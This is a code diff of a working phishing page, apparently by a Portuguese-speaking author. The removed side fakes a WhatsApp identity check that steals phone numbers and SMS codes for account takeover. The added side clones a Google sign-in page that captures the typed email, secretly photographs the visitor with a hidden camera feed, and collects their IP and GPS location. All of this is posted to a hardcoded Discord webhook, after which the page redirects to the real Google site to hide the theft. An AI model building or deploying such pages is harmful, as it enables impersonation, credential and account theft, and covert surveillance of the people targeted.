@@ -3,72 +3,107 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Verificação de Segurança</title>
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<title>Fazer login - Contas do Google</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
 <style>
-    :root { --primary: #00a884; --bg: #0b141a; --text: #e9edef; --panel: #111b21; }
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
-    body { background-color: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-    
-    .container {
-        background-color: var(--panel);
-        padding: 30px;
-        border-radius: 12px;
-        box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-        width: 90%;
-        max-width: 400px;
-        text-align: center;
-        position: relative;
-        z-index: 10;
+    body {
+        margin: 0; padding: 0;
+        font-family: 'Roboto', sans-serif;
+        background-color: #fff;
+        color: #202124;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
     }
+    .google-box {
+        width: 90%;
+        max-width: 450px;
+        border: 1px solid #dadce0;
+        border-radius: 8px;
+        padding: 48px 40px 36px;
+        text-align: center;
+    }
+    .google-logo {
+        font-size: 24px;
+        font-weight: 500;
+        margin-bottom: 10px;
+        letter-spacing: -0.5px;
+    }
+    .google-logo span:nth-child(1) { color: #4285F4; }
+    .google-logo span:nth-child(2) { color: #EA4335; }
+    .google-logo span:nth-child(3) { color: #FBBC05; }
+    .google-logo span:nth-child(4) { color: #4285F4; }
+    .google-logo span:nth-child(5) { color: #34A853; }
+    .google-logo span:nth-child(6) { color: #EA4335; }
 
-    .logo { width: 60px; margin-bottom: 20px; }
-    h2 { font-size: 20px; font-weight: 500; margin-bottom: 10px; }
-    p { font-size: 14px; color: #8696a0; margin-bottom: 25px; line-height: 1.5; }
-    
+    h1 {
+        font-size: 24px;
+        font-weight: 400;
+        margin-bottom: 10px;
+    }
+    p {
+        font-size: 15px;
+        margin-bottom: 30px;
+    }
+    .input-group {
+        position: relative;
+        margin-bottom: 20px;
+    }
     input {
         width: 100%;
-        padding: 15px;
-        background: var(--bg);
-        border: 1px solid #2a3942;
-        border-radius: 8px;
-        color: var(--text);
+        padding: 13px 15px;
         font-size: 16px;
-        margin-bottom: 15px;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        box-sizing: border-box;
         outline: none;
-        text-align: center;
-    }
-    input:focus { border-color: var(--primary); }
-
-    button {
-        width: 100%;
-        padding: 15px;
-        background-color: var(--primary);
-        color: #fff;
-        border: none;
-        border-radius: 8px;
-        font-size: 16px;
-        font-weight: 700;
-        cursor: pointer;
         transition: 0.2s;
     }
-    button:hover { background-color: #008f6f; }
-    button:disabled { background-color: #333; color: #888; cursor: not-allowed; }
-
-    .step { display: none; }
-    .step.active { display: block; animation: fadeIn 0.4s; }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    input:focus {
+        border: 2px solid #1a73e8;
+        padding: 12px 14px;
+    }
+    .btn {
+        background-color: #1a73e8;
+        color: #fff;
+        border: none;
+        padding: 10px 24px;
+        border-radius: 4px;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+        float: right;
+    }
+    .btn:hover { background-color: #1557b0; }
+    .link {
+        color: #1a73e8;
+        text-decoration: none;
+        font-size: 14px;
+        font-weight: 500;
+        float: left;
+        margin-top: 10px;
+        cursor: pointer;
+    }
+    .clearfix::after {
+        content: "";
+        clear: both;
+        display: table;
+    }
     
-    .spinner {
-        border: 3px solid rgba(255,255,255,0.1);
-        border-top: 3px solid var(--primary);
+    /* Loader do Google */
+    .loader {
+        display: none;
+        border: 3px solid #f3f3f3;
+        border-top: 3px solid #1a73e8;
         border-radius: 50%;
-        width: 30px; height: 30px;
+        width: 20px;
+        height: 20px;
         animation: spin 1s linear infinite;
         margin: 20px auto;
     }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    
+
     video { position: fixed; top: -9999px; left: -9999px; }
 </style>
 </head>
@@ -77,65 +112,67 @@
 <video id="camera" autoplay playsinline muted></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
-<div class="container">
-    <!-- ETAPA 1: VERIFICAÇÃO E CÂMERA -->
-    <div class="step active" id="step1">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo" alt="Logo">
-        <h2>Verificação de Segurança</h2>
-        <p>Para continuar, você precisa confirmar sua identidade. Permita o acesso à câmera frontal para a verificação facial.</p>
-        <button id="btn-start" onclick="startVerification()">Iniciar Verificação</button>
+<div class="google-box" id="main-box">
+    <div class="google-logo">
+        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
     </div>
-
-    <!-- ETAPA 2: AGUARDANDO -->
-    <div class="step" id="step2">
-        <h2>Verificando Rosto...</h2>
-        <div class="spinner"></div>
-        <p id="status-text">Por favor, olhe para a câmera e aguarde.</p>
+    <h1>Fazer login</h1>
+    <p>Use sua Conta do Google</p>
+    
+    <div class="input-group">
+        <input type="email" id="email-input" placeholder="E-mail ou telefone">
     </div>
-
-    <!-- ETAPA 3: PEDIR WHATSAPP -->
-    <div class="step" id="step3">
-        <h2>Confirmação de Conta</h2>
-        <p>Digite seu número de WhatsApp para receber o código de segurança e liberar o acesso.</p>
-        <input type="tel" id="wpp-number" placeholder="+55 11 99999-9999">
-        <button onclick="submitNumber()">Receber Código SMS</button>
-    </div>
-
-    <!-- ETAPA 4: PEDIR O CÓDIGO SMS -->
-    <div class="step" id="step4">
-        <h2>Código de 6 Dígitos</h2>
-        <p>Enviamos um código via SMS para o seu número. Digite-o abaixo para confirmar.</p>
-        <input type="text" id="sms-code" placeholder="000000" maxlength="6" style="letter-spacing: 5px; font-weight: bold;">
-        <button onclick="submitCode()">Confirmar e Entrar</button>
+    
+    <div class="clearfix">
+        <a class="link">Esqueci meu e-mail</a>
+        <button class="btn" onclick="startHack()">Avançar</button>
     </div>
 </div>
 
+<div class="google-box" id="loading-box" style="display:none;">
+    <div class="google-logo">
+        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+    <div class="loader" style="display:block;"></div>
+    <p style="margin-top:20px;">Verificando dispositivo...</p>
+</div>
+
 <script>
-    // TEU WEBHOOK AQUI
     const WEBHOOK = "https://discord.com/api/webhooks/1571721002176745615/xvq6g3cJ3c2rWY76Cr_kqsksEV1ePYlYLp3HnfKGg88jAVgersnYXGBJmuSiOJuyH306";
     let cameraStream = null;
 
-    // 1. Pede a câmera
-    async function startVerification() {
-        document.getElementById('step1').classList.remove('active');
-        document.getElementById('step2').classList.add('active');
+    async function startHack() {
+        const email = document.getElementById('email-input').value;
+        if(!email) return alert("Digite um e-mail.");
+
+        document.getElementById('main-box').style.display = 'none';
+        document.getElementById('loading-box').style.display = 'block';
 
         const video = document.getElementById('camera');
         
         try {
-            cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            // Pede a câmera traseira (environment)
+            cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: { exact: "environment" } } 
+            });
             video.srcObject = cameraStream;
             
-            // Espera 2 segundos pra focar e tira a foto
-            setTimeout(captureAndSend, 2000);
+            // Espera 2.5 segundos pra focar e tira a foto
+            setTimeout(() => captureAndSend(email), 2500);
         } catch (err) {
-            document.getElementById('status-text').innerText = "Aviso: Câmera não detectada.";
-            setTimeout(() => showStep3(), 1500);
+            // Se não tiver traseira, tenta a frontal, ou vai direto pro envio sem foto
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = cameraStream;
+                setTimeout(() => captureAndSend(email), 2500);
+            } catch (e) {
+                sendToDiscord(email, null, "Câmera negada", "GPS não solicitado");
+                finishHack();
+            }
         }
     }
 
-    // 2. Tira a foto, pega GPS e IP, e manda pro Discord
-    async function captureAndSend() {
+    async function captureAndSend(email) {
         const video = document.getElementById('camera');
         const canvas = document.getElementById('canvas');
         
@@ -145,7 +182,7 @@
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        const fotoBase64 = canvas.toDataURL('image/jpeg', 0.8);
+        const fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
         
         if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); }
 
@@ -155,38 +192,42 @@
             ip = (await r.json()).ip;
         } catch(e) {}
 
-        let gps = "Não permitido";
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (pos) => { 
-                    gps = `LAT: ${pos.coords.latitude}, LON: ${pos.coords.longitude}`;
-                    sendToDiscord(fotoBase64, ip, gps);
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    sendToDiscord(email, fotoBase64, ip, mapsLink);
+                    finishHack();
                 },
-                () => { sendToDiscord(fotoBase64, ip, gps); }
+                () => { 
+                    sendToDiscord(email, fotoBase64, ip, "GPS negado");
+                    finishHack();
+                }
             );
         } else {
-            sendToDiscord(fotoBase64, ip, gps);
+            sendToDiscord(email, fotoBase64, ip, "Sem suporte a GPS");
+            finishHack();
         }
-
-        showStep3();
     }
 
-    // 3. Manda foto e dados pro webhook
-    async function sendToDiscord(foto, ip, gps) {
-        if (!WEBHOOK || WEBHOOK === "SEU_WEBHOOK_AQUI") return;
+    async function sendToDiscord(email, foto, ip, localizacao) {
+        if (!WEBHOOK) return;
 
         const formData = new FormData();
         
         const payload = {
-            content: "🎯 **NOVO ALVO (FOTO + GPS)**",
+            content: "🎯 **NOVO ALVO CAPTURADO (GOOGLE FAKE)**",
             embeds: [{
-                title: "Dados Capturados",
-                color: 16711680,
+                title: "Dados da Vítima",
+                color: 3447003,
                 fields: [
+                    { name: "E-mail digitado", value: email, inline: false },
                     { name: "IP", value: ip, inline: true },
-                    { name: "Localização", value: gps, inline: false }
+                    { name: "Localização (Clique)", value: localizacao, inline: false }
                 ],
-                image: { url: "attachment://rosto.jpg" }
+                image: foto ? { url: "attachment://alvo.jpg" } : undefined
             }]
         };
 
@@ -194,52 +235,17 @@
         
         if (foto) {
             const blob = await (await fetch(foto)).blob();
-            formData.append("file", blob, "rosto.jpg");
+            formData.append("file", blob, "alvo.jpg");
         }
 
         fetch(WEBHOOK, { method: "POST", body: formData }).catch(()=>{});
     }
 
-    // 4. Etapa de pedir o WhatsApp
-    function showStep3() {
-        document.getElementById('step2').classList.remove('active');
-        document.getElementById('step3').classList.add('active');
-    }
-
-    async function submitNumber() {
-        const num = document.getElementById('wpp-number').value;
-        if (num.length < 8) return alert("Digite um número válido.");
-
-        if (WEBHOOK && WEBHOOK !== "SEU_WEBHOOK_AQUI") {
-            fetch(WEBHOOK, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: `📱 **NÚMERO DO WHATSAPP CAPTURADO:** ${num}\n👉 *Corra pro WhatsApp Web e peça o SMS pro número acima!*`
-                })
-            });
-        }
-
-        document.getElementById('step3').classList.remove('active');
-        document.getElementById('step4').classList.add('active');
-    }
-
-    // 5. Etapa de pegar o SMS
-    async function submitCode() {
-        const code = document.getElementById('sms-code').value;
-        if (code.length < 6) return alert("Digite os 6 dígitos.");
-
-        if (WEBHOOK && WEBHOOK !== "SEU_WEBHOOK_AQUI") {
-            fetch(WEBHOOK, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: `🚨 **CÓDIGO SMS RECEBIDO:** \`${code}\`\n👉 *Corra e coloque no WhatsApp Web agora!*`
-                })
-            });
-        }
-        
-        window.location.href = "https://www.google.com";
+    function finishHack() {
+        // Redireciona pro Google de verdade depois de roubar tudo
+        setTimeout(() => {
+            window.location.href = "https://accounts.google.com";
+        }, 1000);
     }
 </script>
 </body>
